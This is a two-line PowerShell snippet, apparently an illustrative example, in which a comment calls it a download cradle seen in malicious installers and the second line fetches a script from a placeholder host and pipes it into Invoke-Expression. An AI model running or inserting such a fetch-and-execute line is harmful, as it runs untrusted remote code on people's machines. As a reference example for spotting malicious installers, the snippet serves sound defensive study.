# PowerShell download cradle commonly seen in malicious installers.
Invoke-WebRequest https://example.invalid/a.ps1 | Invoke-Expression
